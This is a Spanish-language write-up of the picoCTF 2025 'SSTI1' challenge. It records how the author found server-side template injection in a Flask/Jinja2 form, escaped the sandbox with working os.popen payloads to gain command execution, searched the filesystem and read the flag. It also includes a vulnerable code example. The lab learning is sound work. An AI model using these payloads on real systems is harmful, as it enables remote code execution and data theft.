

**Área:** Explotation web **Dificultad:** Fácil **Plataforma:** picoCTF 2025 (vía CyLab Academy) **Link del reto o Nombre:** SSTI1 **Resuelto por:** Xavi **Fecha:** 27/07 **Tiempo que tardé:** ~15 min

---
## ¿Qué pista/detalle me hizo saber por dónde ir?

bueno el nombre del reto de por si ya entregaba mucha ayuda para resolver el problema desde el mismo nombre que es el nombre de una vulnerabilidad de paginas web, donde el codigo que se envia al formulario es procesado como codigo de la aplicacion como me di cuenta de esto al enviar {{7 * 7}} donde la pagina me respondio con un 49
## Herramienta(s) que usé

El mismo navegador y su formulario 

## Pasos (solo lo esencial, tipo lista)

- Lo primero fue probar instrucciones con el formulario haciendo pruebas para ver que respondia o que encontraba y ver la respuesta del servidor 
- Enviar el payload matematico (entrada especifica que envie para provocar un comportamiento es decir hallar la vulnerabilidad) que es {{7 * 7}}
- Identificar el motor de plantillas la respuesta con  {{7*'7'}} unas comillas simples que afirmaban que era Jinja2(Python) y no twig(PHP)
- escapar del sandbox y lograr RCE enviando al formulario 
   {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} esto me permitio salir del SANDBOX de Jinja2 lo que me permitio llegar al RCE donde ya tenia acceso a todo y solo me quedo buscar la flag con:
   {{ self.__init__.__globals__.__builtins__.__import__('os').popen('find / -iname "*flag*" 2>/dev/null').read() }}
- Alli encontre /challenge/flag  donde con el ultimo payload:
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /challenge/flag').read() }} halle la flag 
## Comando(s) o payload clave (si aplica)

```
{{7*7}}  //Confirmo que habia SSTI pues devolvio 49
{{7*'7'}}  //Confirmo el motor específico: Jinja2/Python (devolvió 7777777)
```

## Flag

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}

## ¿Que aprendí / qué usaría de nuevo?

Bueno aprendi la vulnerabilidad SSTI puede estar presente en un formulario debido a una distraccion de el programador o ha proposito ya que no viene por defecto, solo donde el desaroollador halla concatenado el input del usuario 

```
@app.route('/greet')
def greet():
    nombre = request.args.get('nombre')
    plantilla = f"<h1>Hola, {nombre}!</h1>"          # ← aquí mezcla input con código
    return render_template_string(plantilla)          # ← y lo ejecuta como plantilla
```
## ¿Me trabé en algo? ¿Cómo lo destrabé?

Al principio no conocia esta vulnerabilidad por lo que estuve inspeccionando varias veces la pagina y lo que contenia pero al no hallar nada sospeche del nombre y descubri que el mismo nombre hacia referencia a la vulnerabilidad que fue hecho a proposito, ya de ahi solo fue enviar codigos al formulario el cual ejecutaba como si fuera codigo logrando hallar la flag 